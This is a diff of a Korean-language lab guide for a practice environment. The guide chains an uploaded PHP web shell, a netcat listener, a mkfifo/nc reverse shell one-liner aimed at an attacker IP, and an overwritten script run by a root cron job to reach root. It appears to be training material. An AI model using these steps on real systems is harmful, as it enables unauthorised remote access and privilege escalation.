@@ -49,8 +49,8 @@
     
     ```bash
     vi /etc/cron.d/fileupload
-    # vi가 없는 경우 apt update && apt install -y vim-tiny
     
+    # 해당 스케줄러 실행 시 root 권한으로 실행됩니다. ( 권한 상승 지점 )
     * * * * * root /tmp/fileupload
     ```
     
@@ -95,21 +95,25 @@
 
 1. 웹 페이지 접속 후 임의의 PHP web shell 파일 (예: `shell.php`) 업로드 합니다.
 2. 업로드 성공 후 `/uploads/shell.php` 로 접근합니다.
-3. 입력창에 작성한 명령어가 실행되어 결과가 출력 되는 걸 확인합니다.
+3. 입력창에 `id`명령어 작성 후 결과가 출력 되는 걸 확인합니다.
+    1. `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 4. `/etc/cron.d` 폴더 안에 있는 `fileupload` 파일을 확인합니다.
+    1. `cat /etc/cron.d/fileupload`
 5. 공격자 PC에서 `ifconfig`를 통해 IP를 확인합니다.
 6. 공격자 PC에서 `nc -nlvp 9999`로 9999 포트를 리스닝 합니다.
 7. `Reverse Shell Cheat Sheet`를 활용하여 스크립트를 만듭니다.
     1. 참고 사이트 : https://www.revshells.com/
-    2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|**sh** -i 2>&1|nc 공격자IP **9999** >/tmp/f`
+    2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 공격자IP 9999 >/tmp/f`
 8. 아래 악성 스크립를 통해 스케줄러에서 실행되는 파일을 수정합니다.
 `printf 'cheat sheet \n' > /tmp/fileupload && chmod +x /tmp/fileupload` 
     1. 마지막 빈줄 삽입이 없는 경우 명령어가 무시되는 경우가 발생합니다.
+9. 1분 후 공격자 PC에서 `id` 명령어를 통해 root 계정을 사용하는 것을 확인합니다.
+    
 
 # 6. 참고 사항 (VirtualBox 환경)
 
 - Kali Linux가 VirtualBox에 설치되어 있는 경우
-    - 설정 → 네트워크 → 어댑터1 → **'브리지 어댑터'** 설정
+    - 설정 → 네트워크 → 어댑터1 → '브리지 어댑터' 설정
     - 인터페이스 이름은 실제 사용하는 네트워크(Wi-Fi/LAN 등)로 지정
     - 설정 후 재시작 필요합니다.
 - 동일 물리 네트워크 상의 다른 장비 사용 시 별도 설정 불필요합니다.
